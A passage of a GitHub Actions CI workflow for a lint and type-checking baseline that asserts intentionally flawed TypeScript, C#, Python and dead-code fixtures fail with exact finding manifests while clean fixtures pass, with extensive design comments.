# maxi-quality — self-test (issue #6).
#
# samples/ is the test suite. Most samples are intentionally BAD and the jobs
# assert that a gate FIRES: a green run means "the baseline still rejects what
# it must reject, with exactly the documented counts". If a sample stops
# failing — or fails with a different count — the config regressed; fix the
# config, never the sample (CLAUDE.md §5).
#
# The `-clean` samples are the other direction: they must PASS with zero
# findings. Both halves matter. A config that flags everything is as useless as
# one that flags nothing, and the "clean code passes" half was documented long
# before anything tested it.
#
# THE ASSERTION IS THE SET OF FINDINGS, NOT A COUNT.
#
# Every gate here used to grep for a total — "8 problems", "13 Error(s)",
# "32 findings". A total answers "did roughly the right amount fire?" and
# nothing else, so a rule could stop firing while another fired once more and
# the number never moved. That is not hypothetical: `sql-string-concat-ts`
# shipped with only its double-quoted branch and 28/19 stayed green over the gap
# for months (STATUS §4). Worse, configs/typescript enables 140 ESLint rules and
# the "8 problems" grep pinned 8 of them.
#
# So each sample now has a committed manifest in samples/expected/ listing every
# finding as rule id + file + line, and scripts/check-expected.py diffs the tool's
# own machine-readable output against it. A regression NAMES the rule that
# stopped firing. Counts are still printed, as a summary, not as the assertion.
#
# Regenerate a manifest with `--update` when a fixture or rule genuinely changes,
# and say in the commit message what changed and why the new set is correct
# (CONTRIBUTING.md rule 2). CI never passes `--update`: a gate that can rewrite
# its own expectations is not a gate.

name: ci

on:
  # Both long-lived branches, so the MERGE COMMIT is tested and not only the
  # branch that produced it — a PR is green against a base that may have moved.
  # Only `main` wakes release-tag.yml (it filters on the triggering run's head
  # branch), so a push to develop runs the suite and moves no tag.
  push:
    branches: [main, develop]
  pull_request:

# Declared here rather than inherited from the repo setting, and that is the
# point. The repo default is already read-only, so this changes nothing today —
# it changes what happens the day someone flips that setting back, or forks
# this repo without it. A workflow that relies on a setting it cannot see is
# relying on something no reviewer of this file can check.
#
# Found by BOTH tools added in #61, independently, on their first run: CodeQL
# raised actions/missing-workflow-permissions once per job (21 alerts) and
# Scorecard scored Token-Permissions 0 on `no topLevel permission defined`.
# That agreement is the argument for keeping them — the settings layer had no
# fixtures, and this is the first thing it caught.
#
# `contents: read` is the whole requirement: every job here reads the tree,
# runs analyzers over fixtures and asserts counts. Nothing in this file calls
# the API or writes anything back. The one workflow that does need write is
# release-tag.yml, which declares it locally.
permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  layer1-typescript:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7
        with:
          node-version: '24'
          cache: npm
      - run: npm ci
      # THE FIXTURE CANNOT PROVE THE CONFIG. samples/typescript triggers 8 rules;
      # the baseline enables 140. Everything the fixture does not bait can be
      # deleted with every finding assertion still green — measured: replacing
      # the shared config with an 18-line file that drops recommended,
      # strictTypeChecked and stylisticTypeChecked and hand-lists those 8 rules
      # left both TS steps passing. So the enabled rule SET, with its options, is
      # asserted directly. This is the only check that sees `no-misused-promises`
      # being switched off, or `eqeqeq`'s options reverted to the default.
      - name: The enabled ESLint rule set must not change silently
        shell: bash
        run: node scripts/snapshot-eslint-rules.mjs --check
      - name: Sample must fail with exactly the expected findings
        shell: bash
        run: |
          # The runner's bash defaults to -e; a plain `out=$(failing)` would
          # kill the step before rc is captured. `|| rc=$?` is the -e-safe form.
          set -uo pipefail
          # Two assertions, deliberately separate. First the GATE behaviour a
          # consumer actually gets — `--max-warnings 0` and a non-zero exit...
          rc=0; out=$(npm run verify:ts 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/typescript passed the lint — the config regressed'
            exit 1
          fi
          # ...then WHICH rules fired. eslint is re-run for JSON rather than
          # parsed out of the human output: the formatter is a stable contract,
          # the pretty output is not.
          (cd samples/typescript && ../../node_modules/.bin/eslint src -f json) > /tmp/eslint.json || true
          python3 scripts/check-expected.py --tool eslint \
            --input /tmp/eslint.json --expected samples/expected/eslint.json
      # The other half of the claim. A gate that flags everything is as useless
      # as one that flags nothing, and this was asserted in the docs long before
      # anything tested it.
      - name: Clean TS sample must PASS with zero findings
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(npm run verify:ts:clean 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -ne 0 ]]; then
            echo '::error::samples/typescript-clean was flagged — the baseline is over-strict. Fix the config, do not add disable comments to the fixture.'
            exit 1
          fi
          # An empty manifest, checked the same way as the others: when the
          # baseline does become over-strict, this names the rule that fired
          # instead of leaving a bare non-zero exit to be diagnosed by hand.
          (cd samples/typescript-clean && ../../node_modules/.bin/eslint src -f json) > /tmp/eslint-clean.json || true
          python3 scripts/check-expected.py --tool eslint \
            --input /tmp/eslint-clean.json --expected samples/expected/eslint-clean.json
      # --- tsconfig.strict.json, issue #7 -----------------------------------
      # Everything above tests ESLint. tsc was run by NOTHING, so 13 of the 14
      # hand-written compiler flags had no test and any of them could be deleted
      # with every job green. Same two-part shape as the ESLint half: assert the
      # resolved CONFIGURATION, then assert that it produces errors.
      - name: The resolved TypeScript compiler options must not change silently
        shell: bash
        run: node scripts/snapshot-tsconfig.mjs --check
      - name: Strict TS sample must FAIL with exactly the expected diagnostics
        shell: bash
        run: |
          set -uo pipefail
          # The gate a consumer actually gets: a non-zero tsc.
          rc=0; out=$(npm run verify:ts:types 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/typescript-strict type-checked — tsconfig.strict.json regressed'
            exit 1
          fi
          # Then WHICH diagnostics. `-p <dir>` from the repo root rather than a
          # cd, because tsc prints paths relative to the CWD and the manifest
          # holds repo-relative ones.
          ./node_modules/.bin/tsc --noEmit -p samples/typescript-strict > /tmp/tsc.txt 2>&1 || true
          python3 scripts/check-expected.py --tool tsc \
            --input /tmp/tsc.txt --expected samples/expected/tsc.json
      - name: Clean TS sample must TYPE-CHECK with zero diagnostics
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(npm run verify:ts:types:clean 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -ne 0 ]]; then
            echo '::error::samples/typescript-clean failed to type-check — the compiler baseline is over-strict. Fix the config, do not add ts-expect-error to the fixture.'
            exit 1
          fi
          ./node_modules/.bin/tsc --noEmit -p samples/typescript-clean > /tmp/tsc-clean.txt 2>&1 || true
          python3 scripts/check-expected.py --tool tsc \
            --input /tmp/tsc-clean.txt --expected samples/expected/tsc-clean.json
      # declaration/declarationMap/sourceMap are the three flags no --noEmit run
      # can see. They are worth asserting because a consumer publishing a library
      # loses its .d.ts silently: nothing fails, the package just ships untyped.
      - name: The emit flags must actually emit
        shell: bash
        run: |
          set -Eeuo pipefail
          rm -rf /tmp/ts-emit
          ./node_modules/.bin/tsc -p samples/typescript-clean --noEmit false --outDir /tmp/ts-emit
          for f in clean.d.ts clean.d.ts.map clean.js.map; do
            [[ -f /tmp/ts-emit/$f ]] || {
              echo "::error::$f was not emitted — declaration/declarationMap/sourceMap regressed in tsconfig.strict.json"
              exit 1
            }
          done
      # --- the formatter, issue #42 -----------------------------------------
      # docs/CONCEPT.md §4 has claimed since the first commit that formatting is
      # "autofixed, never argued about". For TypeScript that was a claim with
      # nothing behind it — no config, no tool, no check — which is the same
      # shape as every other bug this repo has shipped.
      - name: Everything Prettier owns must already be formatted
        shell: bash
        run: npm run verify:format
      # THE ONE THAT MATTERS, and it is the ablation the step above cannot do.
      # "The tree is formatted" and "the tree is formatted BY OUR CONFIG" are
      # different claims, and only the second is worth a config file. Measured
      # 2026-08-05, prettier 3.9.6: with `--no-config`, 21 files fail — Prettier
      # defaults to printWidth 80 (we ship 100, matching configs/editorconfig
      # and ruff.toml) and to double quotes (we ship single). Delete
      # configs/typescript/prettier.config.mjs and the step above stays green.
      - name: ...and formatted by OUR config, not Prettier's defaults
        shell: bash
        run: |
          set -uo pipefail
          rc=0
          ./node_modules/.bin/prettier --no-config \
            --check "**/*.{ts,mts,cts,js,mjs,cjs}" >/dev/null 2>&1 || rc=$?
          if [[ $rc -eq 0 ]]; then
            echo '::error::the tree is formatted identically with and without configs/typescript/prettier.config.mjs — that config is now proving nothing. Either printWidth/singleQuote were reverted to Prettier defaults, or the settings that differ no longer appear in any checked file.'
            exit 1
          fi
          echo 'OK: the shipped Prettier config changes the verdict'
      # --ignore-path /dev/null on purpose: .prettierignore lists samples/format
      # so that `npm run format` cannot quietly repair the fixtures, and this is
      # the one place that has to look past it.
      - name: The misformatted TS fixture must be REJECTED
        shell: bash
        run: |
          set -uo pipefail
          rc=0
          ./node_modules/.bin/prettier --config configs/typescript/prettier.config.mjs \
            --ignore-path /dev/null --check samples/format/bad-format.ts >/dev/null 2>&1 || rc=$?
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/format/bad-format.ts passed prettier --check. Either the fixture was formatted (do not do that — fix the config instead) or the gate stopped reading it.'
            exit 1
          fi
          # And the width ablation from the other side: this file is Prettier-
          # clean at printWidth 100 and dirty at Prettier's default 80. Both
          # halves are asserted, because "fails with defaults" alone is also
          # what a plain syntax error looks like.
          rc=0
          ./node_modules/.bin/prettier --config configs/typescript/prettier.config.mjs \
            --ignore-path /dev/null --check samples/format/needs-width-100.ts >/dev/null 2>&1 || rc=$?
          [[ $rc -eq 0 ]] || {
            echo '::error::samples/format/needs-width-100.ts is not clean under our config — printWidth regressed, or the fixture line drifted outside 81-100 chars'
            exit 1; }
          rc=0
          ./node_modules/.bin/prettier --no-config \
            --ignore-path /dev/null --check samples/format/needs-width-100.ts >/dev/null 2>&1 || rc=$?
          [[ $rc -ne 0 ]] || {
            echo '::error::samples/format/needs-width-100.ts is clean under Prettier defaults too — its long line no longer exceeds 80 chars, so it separates nothing'
            exit 1; }
          echo 'OK: the misformatted fixture fails and the width ablation separates 100 from 80'
      # --- knip, issue #51 --------------------------------------------------
      # Dead files, unused exports/types and unused/unlisted dependencies —
      # the slop classes that survived #39's measurement (6 of 6 planted
      # findings, 0 of 6 negative controls flagged, and 19× quieter than a
      # lint recommended-set on real code). Same two-part shape as every other
      # gate: the bad fixture must FAIL with exactly the manifest, the clean
      # one must PASS with zero findings.
      #
      # knip runs from inside the fixture and prints paths relative to it, so
      # samples/expected/knip*.json are fixture-relative where the other
      # manifests are repo-relative — scripts/check-expected.py says so too.
      - name: Knip fixture must fail with exactly the expected findings
        shell: bash
        run: |
          set -uo pipefail
          rc=0; (cd samples/knip && ../../node_modules/.bin/knip --reporter json) > /tmp/knip.json || rc=$?
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/knip passed knip — the dead-code/dependency detection regressed'
            exit 1
          fi
          python3 scripts/check-expected.py --tool knip \
            --input /tmp/knip.json --expected samples/expected/knip.json
      - name: Clean knip sample must PASS with zero findings
        shell: bash
        run: |
          set -uo pipefail
          rc=0; (cd samples/knip-clean && ../../node_modules/.bin/knip --reporter json) > /tmp/knip-clean.json || rc=$?
          if [[ $rc -ne 0 ]]; then
            cat /tmp/knip-clean.json
            echo '::error::samples/knip-clean was flagged — the gate is over-strict. Fix the config, do not add ignores to the fixture.'
            exit 1
          fi
          python3 scripts/check-expected.py --tool knip \
            --input /tmp/knip-clean.json --expected samples/expected/knip-clean.json
      # The ablation, same argument as the Prettier --no-config step above:
      # "the clean fixture passes" and "the clean fixture passes BECAUSE OF
      # its knip.json" are different claims. The fixture's entry point is
      # deliberately not one knip would find on its own (src/clean.ts), which
      # is what #39 measured on every real consumer: a zero-config run on a
      # non-default layout reports the layout, not defects. Config aside, the
      # verdict must flip.
      - name: ...and its knip.json is what makes it pass, not knip's defaults
        shell: bash
        run: |
          set -uo pipefail
          mv samples/knip-clean/knip.json /tmp/knip-config-aside.json
          rc=0; (cd samples/knip-clean && ../../node_modules/.bin/knip --reporter json) >/dev/null 2>&1 || rc=$?
          mv /tmp/knip-config-aside.json samples/knip-clean/knip.json
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/knip-clean passes without its knip.json — the entry declaration is proving nothing. Either knip defaults grew to cover src/clean.ts or the fixture layout drifted to a default one.'
            exit 1
          fi
          echo 'OK: the shipped knip.json changes the verdict'

      # --- the GATE over those findings, issue #97 --------------------------
      # The three steps above prove knip detects. They say nothing about which
      # findings may FAIL A CONSUMER'S BUILD, and that is a separate decision
      # with its own measurement: 19 of the 26 real-code findings in #39 were
      # exports in a published library, where an unreferenced export is public
      # API rather than a defect. So the gating set is asserted here, from the
      # same fixture output, at each of the three settings a consumer can be in.
      - name: The knip gate gates the measured set, and only that
        shell: bash
        run: |
          set -Eeuo pipefail
          (cd samples/knip && ../../node_modules/.bin/knip --reporter json --no-exit-code) \
            > /tmp/knip-gate.json

          # The assertions below name the RULE AND FILE of every gating finding,
          # not how many there are. scripts/check-expected.py's docstring is the
          # standard and the reason is not hypothetical here: with a count, a
          # `files` finding that stopped gating while `unlisted` gained one
          # leaves knip_gate=3 green over exactly the swap that docstring is
          # about. The counts are still asserted, as the "and nothing else" half.
          gates() { grep -E '^  GATE ' <<<"$1" | awk '{print $2, $3}' | sort; }
          same() {
            diff -u "$1" <(gates "$2") || { echo "::error::$3"; exit 1; }
          }

          # Default: files, dependencies and unlisted gate; exports and types
          # are reported and do not.
          cat > /tmp/knip-want.txt <<'WANT'
          dependencies package.json:9
          files src/orphan.ts:0
          unlisted src/index.ts:2
          WANT
          out=$(python3 scripts/deadcode-gate.py --tool knip --input /tmp/knip-gate.json) && rc=0 || rc=$?
          echo "$out"
          [[ "$rc" -eq 1 ]] || { echo '::error::the knip gate did not fail on the bait fixture'; exit 1; }
          same /tmp/knip-want.txt "$out" 'the gating knip finding SET drifted — see the diff above'
          grep -qx 'knip_advisory=4' <<<"$out" || {
            echo '::error::expected 4 advisory knip findings (3 exports + 1 type)'; exit 1; }

          # ...and dead-code-exports: true is what moves them into the gate. An
          # input nothing can be shown to change is an input nobody should trust.
          cat > /tmp/knip-want-exports.txt <<'WANT'
          dependencies package.json:9
          exports src/barrel/impl.ts:5
          exports src/barrel/index.ts:1
          exports src/util.ts:14
          files src/orphan.ts:0
          types src/util.ts:6
          unlisted src/index.ts:2
          WANT
          out=$(python3 scripts/deadcode-gate.py --tool knip --input /tmp/knip-gate.json --gate-exports) && rc=0 || rc=$?
          [[ "$rc" -eq 1 ]] || { echo '::error::--gate-exports did not fail on the bait fixture'; exit 1; }
          same /tmp/knip-want-exports.txt "$out" \
            '--gate-exports must move exactly the 3 exports and the 1 type into the gate'

          # The ratchet. A legacy repo adopting this must be able to grandfather
          # its backlog or it deletes the gate instead of fixing it — so a
          # finding in an unchanged file is reported and does NOT fail the
          # build, and the same finding in a changed file does. Named, because
          # "one finding gated" is also what gating the WRONG one looks like.
          printf 'src/index.ts\n' > /tmp/knip-changed.txt
          printf 'unlisted src/index.ts:2\n' > /tmp/knip-want-ratchet.txt
          out=$(python3 scripts/deadcode-gate.py --tool knip --input /tmp/knip-gate.json \
                  --changed-list /tmp/knip-changed.txt) && rc=0 || rc=$?
          echo "$out"
          [[ "$rc" -eq 1 ]] || { echo '::error::the ratchet swallowed a finding in a CHANGED file'; exit 1; }
          same /tmp/knip-want-ratchet.txt "$out" \
            'the ratchet must gate the finding in src/index.ts and only that'

          # And it must still be a GATE. A ratchet that gates nothing whatever
          # the diff contains is the `--changed-only` no-op bug again (STATUS §4).
          : > /tmp/knip-nothing.txt
          python3 scripts/deadcode-gate.py --tool knip --input /tmp/knip-gate.json \
            --changed-list /tmp/knip-nothing.txt > /tmp/knip-none.log && rc=0 || rc=$?
          [[ "$rc" -eq 0 ]] || { echo '::error::an empty diff must produce no gating findings'; exit 1; }
          grep -qx 'knip_advisory=7' /tmp/knip-none.log || {
            echo '::error::an empty diff must still REPORT all 7 findings — silence is not a ratchet'; exit 1; }

          # A tool that did not run must never read as clean.
          : > /tmp/knip-empty.json
          rc=0; python3 scripts/deadcode-gate.py --tool knip --input /tmp/knip-empty.json >/dev/null 2>&1 || rc=$?
          [[ "$rc" -eq 3 ]] || { echo "::error::empty knip output must exit 3, got $rc"; exit 1; }
          echo 'OK: the knip gating set, the exports switch, the ratchet and the empty-input refusal all hold'

      # The composite action is the thing a consumer actually runs, so it is
      # exercised rather than re-implemented — the same argument the layer2 job
      # makes for `uses: ./actions/layer2`.
      #
      # The symlink reproduces what every step above already does by hand
      # (`../../node_modules/.bin/knip`): the fixture has no install of its own,
      # and the action deliberately looks for the tool in the PROJECT, because
      # CI runs the version the consumer pinned rather than smuggling in one.
      - name: Wire the clean fixture up as a real package
        shell: bash
        run: ln -s ../../node_modules samples/knip-clean/node_modules

      - name: A repo without knip installed warns in auto mode
        id: absent
        continue-on-error: true
        uses: ./actions/deadcode
        with:
          tool: knip
          dir: samples/knip
          mode: auto

      - name: ...and FAILS in require mode
        id: absent-required
        continue-on-error: true
        uses: ./actions/deadcode
        with:
          tool: knip
          dir: samples/knip
          mode: require

      - name: The clean fixture must pass through the action itself
        id: clean
        continue-on-error: true
        uses: ./actions/deadcode
        with:
          tool: knip
          dir: samples/knip-clean
          mode: require

      - name: Every dead-code action outcome must be the expected one
        shell: bash
        env:
          ABSENT: ${{ steps.absent.outcome }}
          ABSENT_REQUIRED: ${{ steps.absent-required.outcome }}
          CLEAN: ${{ steps.clean.outcome }}
        run: |
          set -Eeuo pipefail
          # samples/knip has no node_modules, so 'auto' must let the build
          # through — v1 is a moving tag and a gate that arrives as an outage on
          # every adopted repo gets deleted. It must still be LOUD, which the
          # action does with ::warning::.
          [[ "$ABSENT" == 'success' ]] || {
            echo "::error::auto mode failed on a repo without knip installed (outcome=$ABSENT) — that is the outage this default exists to avoid"; exit 1; }
          # ...and require mode is the escape hatch that makes the softness
          # opt-out rather than permanent.
          [[ "$ABSENT_REQUIRED" == 'failure' ]] || {
            echo "::error::require mode passed with knip absent (outcome=$ABSENT_REQUIRED) — then it requires nothing"; exit 1; }
          [[ "$CLEAN" == 'success' ]] || {
            echo "::error::samples/knip-clean failed the action (outcome=$CLEAN) — the gate is over-strict, or the action cannot find a tool that is there"; exit 1; }
          echo 'OK: auto warns, require fails, and a clean package passes through the real action'

      - name: Unwire the fixture
        if: always()
        shell: bash
        run: rm -f samples/knip-clean/node_modules

  layer1-dotnet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6
        with:
          dotnet-version: '10.0.x'
      # #8 — the .NET twin of the tsconfig and ESLint snapshots. The finding
      # manifest cannot see a property that bakes no diagnostic out:
      # TreatWarningsAsErrors and WarningLevel change other diagnostics' SEVERITY
      # rather than the set of them, and RestoreLockedMode is conditional on a
      # lock file that samples/dotnet does not have. Deleting any of those left
      # every job green.
      - name: The resolved MSBuild properties must not change silently
        shell: bash
        run: ./scripts/snapshot-msbuild-props.sh --check
      # NOT `working-directory:` — the manifests hold repo-relative paths, so
      # check-expected.py has to run from the repo root.
      - name: Sample must fail with exactly the expected diagnostics
        shell: bash
        run: |
          # -e-safe capture — see the TS job.
          set -uo pipefail
          rc=0; out=$(cd samples/dotnet && dotnet build 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/dotnet built successfully — the config regressed'
            exit 1
          fi
          # ANCHORED. A bare `grep -q '0 Warning(s)'` is a substring match and is
          # satisfied by "10 Warning(s)" — the same bug that let the Tests job
          # accept 13 errors while asserting 3.
          if ! grep -qE '^ +0 Warning\(s\)$' <<<"$out"; then
            echo '::error::expected 0 Warning(s) — TreatWarningsAsErrors regressed'
            exit 1
          fi
          printf '%s' "$out" | python3 scripts/check-expected.py --tool dotnet \
            --input - --expected samples/expected/dotnet.json
      - name: Clean C# sample must BUILD with 0 errors, 0 warnings
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(cd samples/dotnet-clean && dotnet build --nologo --no-incremental 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -ne 0 ]]; then
            echo '::error::samples/dotnet-clean failed to build — the baseline is over-strict. Fix the config, do not add NoWarn to the fixture.'
            exit 1
          fi
          # Anchored, for the reason given in the bad-sample step above: the
          # unanchored form is satisfied by "10 Error(s)" and "20 Warning(s)".
          if ! grep -qE '^ +0 Error\(s\)$' <<<"$out" || ! grep -qE '^ +0 Warning\(s\)$' <<<"$out"; then
            echo '::error::expected 0 Error(s) and 0 Warning(s)'
            exit 1
          fi
          printf '%s' "$out" | python3 scripts/check-expected.py --tool dotnet \
            --input - --expected samples/expected/dotnet-clean.json
      # --- the formatter, issue #42 -----------------------------------------
      #
      # `dotnet format whitespace`, NOT bare `dotnet format`. MEASURED
      # 2026-08-05, SDK 10.0.301: the bare form also runs Code Style analysis
      # and 622 analyzer references, so against samples/dotnet it reports S101,
      # IDE0005, IDE0052, IDE0060 and CS8625 — the BUILD gate's findings wearing
      # the formatter's exit code. One red check would then mean two unrelated
      # things, and the build step above already owns those diagnostics. The
      # `whitespace` subcommand is layout only.
      - name: C# samples must already be whitespace-formatted
        shell: bash
        run: |
          set -Eeuo pipefail
          for d in samples/dotnet samples/dotnet-clean samples/dotnet-tests; do
            dotnet format whitespace "$d" --verify-no-changes --verbosity quiet
          done
      # THE ABLATION, and this one is not decoration: for C# almost everything
      # in configs/editorconfig agrees with the tool's own defaults, so a
      # fixture that merely fails proves the formatter ran and nothing about
      # WHICH config it ran with. `insert_final_newline = true` is the setting
      # that genuinely differs, so the fixture is a file with no trailing
      # newline and it is checked TWICE — once with the shipped .editorconfig
      # staged beside it, once with none. The two verdicts must disagree.
      #
      # Measured 2026-08-05: without the config, exit 0. With it,
      # `FINALNEWLINE: Fix final newline. Insert '\n'`.
      - name: The shipped .editorconfig must be what decides the C# verdict
        shell: bash
        run: |
          set -uo pipefail
          stage() {
            rm -rf "$1"; mkdir -p "$1"
            cp samples/format/MissingFinalNewline.cs "$1/"
          }
          # Guard the fixture before either run. If an editor or a
          # .gitattributes ever appends the newline, both runs go green and the
          # ablation silently stops testing anything — which is the exact
          # failure mode this whole job exists to catch.
          if [[ -z "$(tail -c 1 samples/format/MissingFinalNewline.cs)" ]]; then
            echo '::error::samples/format/MissingFinalNewline.cs now ENDS with a newline, so it no longer separates the shipped .editorconfig from the tool defaults. Strip the trailing newline (printf, not an editor) to restore the fixture.'
            exit 1
          fi

          stage /tmp/fmt-bare
          rc=0
          dotnet format whitespace /tmp/fmt-bare --folder --verify-no-changes \
            --verbosity quiet >/dev/null 2>&1 || rc=$?
          [[ $rc -eq 0 ]] || {
            echo "::error::the fixture failed dotnet format whitespace with NO .editorconfig (exit $rc) — it is misformatted in some way other than the missing final newline, so the ablation no longer isolates insert_final_newline"
            exit 1; }

          stage /tmp/fmt-config
          cp configs/editorconfig /tmp/fmt-config/.editorconfig
          rc=0
          dotnet format whitespace /tmp/fmt-config --folder --verify-no-changes \
            --verbosity quiet >/dev/null 2>&1 || rc=$?
          [[ $rc -ne 0 ]] || {
            echo '::error::the fixture PASSED with configs/editorconfig staged beside it — insert_final_newline is no longer being enforced, so the C# format gate is running on tool defaults and configs/editorconfig gates nothing'
            exit 1; }
          echo 'OK: configs/editorconfig changes the verdict — the C# format gate is driven by the shipped config'

  # #25 — the test-project relaxation, asserted from BOTH sides. A one-sided
  # check would pass just as happily if the waiver swallowed everything.
  layer1-dotnet-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6
        with:
          dotnet-version: '10.0.x'
      - name: Waived rules silent, non-waived rules still firing
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(cd samples/dotnet-tests && dotnet build --nologo --no-incremental 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/dotnet-tests built clean — the dead-fixture gate regressed'
            exit 1
          fi
          # Side 1: the non-waived rules must still bite in a Tests project.
          for id in CS0414 IDE0051 S1144; do
            grep -q "error $id" <<<"$out" || {
              echo "::error::$id no longer fires in a Tests project — the NoWarn list is too broad"
              exit 1
            }
          done
          # Side 2: the waived test idioms must stay silent. IDE1006 is in the
          # list since #56 — tests/FixtureNaming.cs plants an un-prefixed
          # fixture field under tests/, where the naming diagnostic is now off.
          for id in S1199 CA1822 S2325 IDE1006; do
            if grep -q "error $id" <<<"$out"; then
              echo "::error::$id fired in a Tests project — the #25/#56 relaxation regressed"
              exit 1
            fi
          done
          # THIS PAIR WAS THE BUG. `grep -q '3 Error(s)'` is a substring match,
          # so it is satisfied by "13 Error(s)" — this job passed green on a
          # build with thirteen errors, ten of them undetected defects. Same for
          # "0 Warning(s)" against "10 Warning(s)". Anchored now, and the
          # manifest below makes the count a consequence rather than the claim.
          grep -qE '^ +3 Error\(s\)$' <<<"$out" || {
            echo '::error::expected exactly 3 Error(s) — the finding count drifted'; exit 1; }
          grep -qE '^ +0 Warning\(s\)$' <<<"$out" || {
            echo '::error::expected 0 Warning(s)'; exit 1; }
          printf '%s' "$out" | python3 scripts/check-expected.py --tool dotnet \
            --input - --expected samples/expected/dotnet-tests.json

  # #15 — Python Layer 1. Two tools, asserted separately on purpose: ruff and
  # mypy catch genuinely different classes of bug, and a combined count would
  # let one tool's config silently break while the other's findings kept the
  # total looking plausible.
  layer1-python:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7
        with:
          python-version: '3.12'
      # requirements-dev.txt is the lint toolchain (+ deptry, #52).
      # samples/deptry/requirements.txt is the deptry fixture's metadata: it
      # installs beautifulsoup4 so deptry can map the `bs4` import back to the
      # declared package — the import-name ≠ package-name control only means
      # something when the package metadata is actually visible.
      - run: |
          pip install -r samples/python/requirements-dev.txt
          pip install -r samples/deptry/requirements.txt
      # #8 — the Python twin of the tsconfig, ESLint and MSBuild snapshots.
      # `ignore = []` is this config's most load-bearing empty value and no
      # fixture can see it; mypy's `strict` is an ALIAS whose expansion no
      # finding proves. Both are asserted here, from each tool's own resolver.
      - name: The resolved ruff and mypy settings must not change silently
        shell: bash
        run: python3 scripts/snapshot-python-settings.py --check
      - name: Ruff sample must fail with exactly 14 errors
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(ruff check --output-format=concise samples/python 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/python passed ruff — the config regressed'
            exit 1
          fi
          ruff check --output-format=json samples/python > /tmp/ruff.json || true
          python3 scripts/check-expected.py --tool ruff \
            --input /tmp/ruff.json --expected samples/expected/ruff.json
      # All 13 selected families must actually be firing. Without this, half the
      # ruleset could be switched off and the count above could still be 14 —
      # the count proves "something fires", this proves "the right things do".
      - name: Every selected rule family must be represented
        shell: bash
        run: |
          set -uo pipefail
          out=$(ruff check --output-format=concise samples/python 2>&1) || true
          missing=()
          for fam in E W F I B C4 UP N SIM ASYNC S T20 RUF; do
            if ! grep -qE ":[0-9]+:[0-9]+: ${fam}[0-9]" <<<"$out"; then
              missing+=("$fam")
            fi
          done
          if [[ ${#missing[@]} -gt 0 ]]; then
            echo "::error::no finding from rule ${missing[*]} — that family is selected but unproven"
            exit 1
          fi
          echo 'OK: all 13 rule families represented in the fixture'
      - name: Mypy sample must fail with exactly 11 errors
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(mypy --config-file configs/python/mypy.ini samples/python/src 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/python passed mypy — the strict config regressed'
            exit 1
          fi
          mypy --config-file configs/python/mypy.ini --output=json samples/python/src \
            > /tmp/mypy.json || true
          python3 scripts/check-expected.py --tool mypy \
            --input /tmp/mypy.json --expected samples/expected/mypy.json
      # The other direction. Idiomatic modern Python must survive the baseline,
      # or the baseline is unadoptable regardless of what it catches.
      - name: Clean Python sample must PASS both tools with zero findings
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(ruff check --output-format=concise samples/python-clean 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -ne 0 ]]; then
            echo '::error::samples/python-clean was flagged by ruff — the baseline is over-strict. Fix the config, do not add noqa to the fixture.'
            exit 1
          fi
          rc=0; out=$(mypy --config-file configs/python/mypy.ini samples/python-clean/src 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -ne 0 ]]; then
            echo '::error::samples/python-clean was flagged by mypy — the baseline is over-strict. Fix the config, do not add type: ignore to the fixture.'
            exit 1
          fi
          echo 'OK: clean Python sample passes ruff and mypy with zero findings'
      # --- the formatter, issue #42 -----------------------------------------
      # configs/python/ruff.toml has had a [format] section since it was written
      # and NOTHING RAN IT. Present, plausible, gating nothing — the same shape
      # as dotnet_diagnostic.IDE1006.severity never being set (docs/STATUS.md §4).
      - name: Python sources must already be ruff-formatted
        shell: bash
        run: |
          set -Eeuo pipefail
          ruff format --check --config configs/python/ruff.toml \
            samples/python samples/python-clean
      - name: The misformatted Python fixture must be REJECTED
        shell: bash
        run: |
          set -uo pipefail
          rc=0
          ruff format --check --config configs/python/ruff.toml \
            samples/format/bad_format.py >/dev/null 2>&1 || rc=$?
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/format/bad_format.py passed ruff format --check. Either the fixture was formatted (do not do that) or the gate stopped reading it.'
            exit 1
          fi
          # The ablation. Everything in [format] is a ruff DEFAULT, so that
          # section on its own is unfalsifiable — delete it and nothing moves.
          # `line-length = 100` is the setting that is not a default (ruff ships
          # 88) and it drives the formatter as well as E501, so it is the one
          # with a fixture: clean at 100, rewrapped at 88. --isolated ignores
